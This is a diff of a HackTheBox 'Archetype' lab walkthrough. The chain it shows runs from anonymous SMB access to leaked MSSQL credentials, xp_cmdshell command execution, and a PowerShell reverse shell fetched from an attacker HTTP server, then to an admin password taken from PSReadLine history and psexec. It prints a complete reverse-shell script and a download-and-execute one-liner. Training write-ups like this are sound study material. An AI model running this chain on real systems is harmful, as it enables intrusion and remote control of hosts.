@@ -1,10 +1,17 @@
 ---
-title: "archetype"
+title: "Archetype — HackTheBox Starting Point Walkthrough"
 date: 2026-01-30
 draft: false
-tags: ["windows", "mssql", "web"]
+tags: ["htb-walkthrough", "windows", "mssql", "web", "smb", "privilege-escalation", "reverse-shell"]
 categories: ["writeups"]
-summary: ""
+series: ["Starting Point"]
+description: "HackTheBox Archetype walkthrough: exploit MSSQL xp_cmdshell via SMB credential leak, escalate to Administrator using PSReadLine history. Windows easy box."
+keywords: ["Archetype HackTheBox", "xp_cmdshell exploit", "MSSQL penetration testing", "SMB enumeration", "impacket mssqlclient", "PSReadLine history password", "SSIS dtsConfig credentials", "hackthebox walkthrough", "impacket psexec", "Windows privilege escalation", "WinRM lateral movement"]
+summary: "Archetype shows how a single misconfigured SMB share cascades into full domain compromise — SSIS config files, xp_cmdshell, and PowerShell history all play a role."
+cover:
+  image: "cover.png"
+  alt: "Archetype — HackTheBox Windows machine walkthrough cover"
+  hidden: false
 params:
   box:
     os: "Windows Server 2019 Standard 17763"
@@ -12,20 +19,20 @@ params:
 ShowToc: true
 ---
 
-# Archetype — HackTheBox Writeup
 
-Archetype is a Windows box that demonstrates a classic lateral movement chain: anonymous SMB access exposes a configuration file with database credentials, which leads to command execution via MSSQL, and sloppy PowerShell history hands us domain admin on a silver platter. It's an excellent box for understanding how real-world Windows environments get compromised through misconfiguration rather than flashy exploits.
+# HackTheBox — Archetype
+
+Archetype is a Windows box that demonstrates a classic misconfiguration chain: an anonymously accessible SMB share leaks database credentials, which lead to MSSQL command execution, which eventually surfaces plaintext admin credentials hiding in PowerShell history. It's a satisfying box precisely because every step flows naturally from the one before it — no guessing, just following the evidence.
 
 ---
 
 ## Overview
 
-| Field | Value |
-|---|---|
-| OS | Windows Server 2019 Standard 17763 |
-| IP | <TARGET> |
-| Difficulty | Starting Point |
-| Date | 2026-01-30 |
+The attack path here is beautifully linear. We find SQL Server credentials in a backup config file shared over an unauthenticated SMB share. Those creds give us sysadmin on MSSQL, which we leverage to pop a reverse shell via `xp_cmdshell`. Once on the box, a quick look at the user's PowerShell command history hands us the administrator password in plaintext. Full compromise in four steps.
+
+**Box details:**
+- **OS:** Windows Server 2019 Standard (Build 17763)
+- **IP:** <TARGET>
 
 ---
 
@@ -33,7 +40,7 @@ Archetype is a Windows box that demonstrates a classic lateral movement chain: a
 
 ### Port Scanning
 
-I start every box the same way — a default script and version scan with nmap. The goal here isn't to be fancy, it's to quickly understand what services are exposed and build a mental model of the attack surface.
+I started with a default Nmap service/version scan. No reason to go aggressive on a lab box — the `-sC -sV` combo gives us service enumeration and runs the standard NSE scripts, which is usually enough to identify interesting attack surface.
 
 ```bash
 nmap -sC -sV $TARGET
@@ -41,11 +48,17 @@ nmap -sC -sV $TARGET
 
 ![terminal output](terminal_01.png)
 
-This is a great set of ports from an attacker's perspective. SMB on 445 is always worth probing for anonymous or guest access. MSSQL on 1433 is a high-value target — if we can authenticate, SQL Server offers direct OS command execution through `xp_cmdshell`. WinRM on 5985 is a remote management interface that we can weaponize with `evil-winrm` or `impacket-psexec` if we land valid credentials.
+![nmap scan revealing SMB on 445, MSSQL on 1433, and WinRM on 5985](terminal_01.png)
+
+Three services immediately stand out:
+
+- **SMB (445)** — Guest access is on and message signing is disabled. Worth enumerating shares.
+- **MSSQL (1433)** — SQL Server 2017, almost certainly a path to code execution if we can get credentials.
+- **WinRM (5985)** — If we land valid credentials, this gives us a remote PowerShell session via `evil-winrm`.
 
 ### SMB Enumeration
 
-Let's see what shares are available. The `-N` flag tells `smbclient` to attempt a null session — no username, no password.
+The disabled message signing on SMB is a flag worth noting (it opens relay attack opportunities), but more immediately useful is the guest access. Let's see what shares are exposed.
 
 ```bash
 smbclient -L //$TARGET/ -N
@@ -53,24 +66,40 @@ smbclient -L //$TARGET/ -N
 
 ![terminal output](terminal_02.png)
 
-The `ADMIN$` and `C$` shares are standard administrative shares that typically require admin credentials. But `backups` is non-standard, and it's accessible anonymously — that's immediately interesting. Let's dig in.
+![smbclient listing showing anonymous access to the backups share](terminal_02.png)
+
+The `backups` share stands out — it's not a default Windows share. Let's connect anonymously and see what's inside.
 
 ```bash
 smbclient //$TARGET/backups -N
 ```
 
-Inside, there's a single file: `prod.dtsConfig`. I pull it down with `get prod.dtsConfig` and take a look at the contents.
+Inside, there's a single file: `prod.dtsConfig`. The `.dtsConfig` extension is an SSIS (SQL Server Integration Services) configuration file — and these are notorious for containing database connection strings in plaintext. I grabbed it immediately.
 
-SSIS (SQL Server Integration Services) configuration files store connection parameters for data pipelines — and critically, those connection strings often include credentials in plaintext. This is exactly what we find:
+```bash
+get prod.dtsConfig
+```
 
-![terminal output](terminal_03.png)
+Opening the file reveals exactly what we were hoping for:
 
-We've got MSSQL credentials without touching a single exploit:
+```xml
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." />
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property"
+        Path="\Package.Connections[OLEDB Connection Manager].Properties[ConnectionString]"
+        ValueType="String">
+        <ConfiguredValue>
+            Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
+            Initial Catalog=Catalog;Provider=SQLNCLI10.1;
+            Persist Security Info=True;Auto Translate=False;
+        </ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>
+```
 
-- **Username:** `ARCHETYPE\sql_svc`
-- **Password:** `M3g4c0rp123`
-
-The reason `.dtsConfig` files end up in accessible shares is usually a deployment shortcut — a developer or DBA drops the config file where the SSIS package can read it, forgets to restrict permissions, and it sits there indefinitely. This is an extremely common finding in real-world Windows environments.
+Credentials in hand: `ARCHETYPE\sql_svc` / `M3g4c0rp123`.
 
 ---
 
@@ -78,23 +107,23 @@ The reason `.dtsConfig` files end up in accessible shares is usually a deploymen
 
 ### Connecting to MSSQL
 
-With credentials in hand, I use Impacket's `mssqlclient` to authenticate against the SQL Server. The `-windows-auth` flag is important here — it tells the tool to use Windows authentication (NTLM) rather than SQL Server authentication.
+With valid credentials and an exposed SQL Server, the next step is connecting and checking our privilege level. Impacket's `mssqlclient` handles Windows authentication cleanly.
 
 ```bash
 impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@$TARGET -windows-auth
 ```
 
-Once connected, I check whether `sql_svc` has sysadmin privileges:
+Once connected, I checked our server role:
 
 ```sql
 SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
 
-The result comes back `1` — we're sysadmin. This is the jackpot for MSSQL exploitation. A sysadmin can enable `xp_cmdshell`, a stored procedure that lets you run arbitrary OS commands as the SQL Server service account.
+The result comes back as `1` — we're sysadmin. This is significant: the `sql_svc` service account has been granted the highest SQL Server privilege level, which means we can enable `xp_cmdshell` and execute operating system commands directly.
 
 ### Enabling xp_cmdshell
 
-`xp_cmdshell` is disabled by default in modern SQL Server, but a sysadmin can re-enable it through `sp_configure`. This is a two-step process: first expose the advanced options, then toggle the feature on.
+`xp_cmdshell` is disabled by default in modern SQL Server installations but can be re-enabled by a sysadmin. It's a stored procedure that lets you run arbitrary OS commands as the SQL Server service account. This is why sysadmin on MSSQL is effectively equivalent to OS command execution.
 
 ```sql
 EXEC sp_configure 'show advanced options', 1;
@@ -103,57 +132,63 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
 
-A quick test confirms code execution:
+Quick verification to confirm it's working:
 
 ```sql
 EXEC xp_cmdshell 'whoami';
 ```
 
-The response is `archetype\sql_svc`. We have OS-level command execution.
+![terminal output](terminal_03.png)
+
+![xp_cmdshell whoami returning archetype\sql_svc](terminal_03.png)
+
+We have command execution as `archetype\sql_svc`.
 
 ### Getting a Reverse Shell
 
-Command execution via `xp_cmdshell` is powerful but awkward for interactive work. I want a proper reverse shell. My approach:
+Running commands through `xp_cmdshell` interactively is functional but awkward. I wanted a proper shell. The plan: host a PowerShell reverse shell script on a local HTTP server, then have the target fetch and execute it.
 
-1. Stand up a Python HTTP server to serve a PowerShell reverse shell script
-2. Use `xp_cmdshell` to download and execute it via PowerShell
-
-First, I create `shell.ps1` on my attacker machine:
+First, I created a minimal reverse shell script (`shell.ps1`):
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', 4444);
+$client = New-Object System.Net.Sockets.TCPClient('<VPN_IP>', 4444);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
-    $sendback = (iex $data 2>&1 | Out-String);
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
     $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte, 0, $sendbyte.Length);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
     $stream.Flush()
-};
+}
 $client.Close()
 ```
 
-Then start the HTTP server and listener:
+Then I set up the Python HTTP server and Netcat listener:
 
 ```bash
-# Terminal 1 — serve the script
+# Terminal 1 — serve the shell script
 python3 -m http.server 80
 
-# Terminal 2 — catch the shell
+# Terminal 2 — listen for the callback
 rlwrap nc -lvnp 4444
 ```
 
-I use `rlwrap` around netcat because it gives us readline support (arrow keys, history) in the shell — small quality-of-life improvement that matters on Windows where the shell can be janky.
-
-Now trigger the download and execution from the MSSQL prompt:
+Back in the MSSQL session, I triggered the download and execution in one command:
 
 ```sql
-EXEC xp_cmdshell 'powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';
+EXEC xp_cmdshell 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(''http://<VPN_IP>/shell.ps1'')"';
 ```
 
-The HTTP server logs a GET request, and the netcat listener catches a shell as `archetype\sql_svc`. We have our foothold.
+The Python server logged the request, and a few seconds later Netcat caught the shell:
+
+```
+connect to [<VPN_IP>] from (UNKNOWN) [<TARGET>] 49678
+PS C:\Windows\system32>
+```
+
+We're in.
 
 ---
 
@@ -161,15 +196,11 @@ The HTTP server logs a GET request, and the netcat listener catches a shell as `
 
 ### Hunting for Credentials
 
-With a shell as `sql_svc`, I need to escalate to Administrator. Before running any fancy tooling, I check the low-hanging fruit: PowerShell command history.
+With a shell as `sql_svc`, the immediate goal is finding a path to Administrator. I started with some quick situational awareness — checking privileges, local group memberships, and any interesting files in the user's home directory.
 
-PSReadLine, which provides enhanced command-line editing in PowerShell, saves a history file at a predictable location:
+One of my go-to checks on Windows boxes is PowerShell command history. The `PSReadLine` module (enabled by default since PowerShell 5) saves every command run in the console to a plaintext file. Administrators frequently run commands with credentials as arguments, and those get logged here permanently. It's a goldmine that's surprisingly often overlooked.
 
-```
-C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```
-
-This file is gold. Sysadmins often type credentials directly into PowerShell — `net use` commands to map drives, `Invoke-WebRequest` calls with embedded tokens, you name it. Let's check it for our user:
+The history file lives at a predictable path:
 
 ```powershell
 type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -177,35 +208,41 @@ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Co
 
 ![terminal output](terminal_04.png)
 
-There it is. An administrator mapped the `backups` share and typed the password directly into the terminal. PSReadLine dutifully recorded it for us.
+![PSReadLine console history revealing administrator password](terminal_04.png)
 
-- **Username:** `administrator`
-- **Password:** `MEGACORP_4dm1n!!`
+There it is: `administrator` / `MEGACORP_4dm1n!!` — passed directly on the command line when someone mapped that backup drive. This is exactly why you should never put credentials in command-line arguments; they end up in shell history, process lists, event logs, and anywhere else the OS decides to record what you ran.
 
 ### Getting a SYSTEM Shell
 
-With local administrator credentials, `impacket-psexec` is the most reliable way to get a shell. It authenticates over SMB, uploads a service binary, executes it, and connects back — the resulting shell runs as `NT AUTHORITY\SYSTEM`.
+With administrator credentials confirmed, `impacket-psexec` is the cleanest way to land a privileged shell. It authenticates over SMB, uploads a service binary, and drops us into a SYSTEM-level cmd.
 
-One gotcha worth noting: the `!` character in `MEGACORP_4dm1n!!` is special in bash and will break things if you're not careful. I either use an interactive password prompt (omit the password from the command line) or wrap it carefully. Here, I invoke `psexec` and enter the password when prompted:
+One note on the password: the `!` character is special in bash and will cause history expansion issues if you're not careful. Using an interactive password prompt (or wrapping in single quotes) avoids headaches here.
 
 ```bash
 impacket-psexec administrator@$TARGET
 ```
 
+When prompted, enter `MEGACORP_4dm1n!!`.
+
 ![terminal output](terminal_05.png)
 
-We're SYSTEM. Both flags are accessible from here.
+![impacket-psexec delivering SYSTEM shell as nt authority\system](terminal_05.png)
+
+Full compromise. Both flags are readable from the standard locations:
+
+- **User flag:** `C:\Users\sql_svc\Desktop\user.txt` — [redacted]
+- **Root flag:** `C:\Users\Administrator\Desktop\root.txt` — [redacted]
 
 ---
 
 ## Lessons Learned
 
-**SSIS configuration files are a credential goldmine.** `.dtsConfig` files store database connection strings, and those connection strings frequently contain plaintext passwords. Any time you see a `backups` or `config` share during SMB enumeration, `.dtsConfig` files should be on your checklist. In production environments, these files should either have credentials removed (use Windows integrated auth instead) or be stored with strict ACLs.
+**SSIS config files are credential treasure chests.** `.dtsConfig` files are designed to store database connection information for SQL Server Integration Services packages, and they store that information in plaintext XML. Finding one in an exposed SMB share is a critical finding in any real engagement — it suggests the organization doesn't treat these files as sensitive secrets.
 
-**Always check PowerShell history.** `ConsoleHost_history.txt` is one of the first files I check on any Windows foothold. Administrators type sensitive commands constantly — credentials for `net use`, passwords for `Invoke-Command`, API keys in `Invoke-WebRequest` headers. It's free intelligence that requires zero exploitation. The fix is using credential managers or password vaults rather than inline credentials.
+**PowerShell history is often overlooked in hardening.** `ConsoleHost_history.txt` persists indefinitely and is readable by the account that created it. Defenders should consider whether PSReadLine history needs to be retained at all, and administrators should absolutely never pass credentials as command-line arguments. Use credential managers, not command-line flags.
 
-**MSSQL sysadmin = OS command execution.** The path from SQL credentials to a shell via `xp_cmdshell` is well-trodden and reliable. If you're doing a pentest and find MSSQL credentials, the first question is always: is this account sysadmin? If yes, you have code execution. Database service accounts should follow the principle of least privilege — most applications don't need sysadmin, they need `db_datareader` and `db_datawriter` on specific databases.
+**MSSQL sysadmin = OS command execution.** This is a fundamental SQL Server security principle. The moment a user has sysadmin privileges, assume they can run arbitrary commands on the underlying OS via `xp_cmdshell`. Service accounts should run with the minimum necessary database permissions — never sysadmin unless explicitly required.
 
-**`rlwrap` makes Windows reverse shells tolerable.** Wrapping netcat with `rlwrap` gives you command history and line editing, which matters when you're working in an interactive shell without a PTY.
+**`impacket-psexec` is reliable but noisy.** It works great in lab environments, but in a real engagement it's one of the most-signatured attack tools out there. It uploads a binary to `ADMIN$`, creates a service, runs it, then cleans up — every one of those actions is logged and alerts on properly monitored infrastructure. Knowing the tool is important; knowing when not to use it is equally important.
 
-**Mind your shell special characters.** The `!` in `MEGACORP_4dm1n!!` causes bash history expansion to fire. Using interactive password prompts (rather than passing credentials directly in command-line arguments) is cleaner and avoids this class of problem entirely.
+**Mind your special characters.** The `!` in `MEGACORP_4dm1n!!` triggers bash history expansion when passed in double quotes or unquoted. Either use single quotes around the password or let the tool prompt you interactively to avoid cryptic authentication failures that look like wrong credentials.
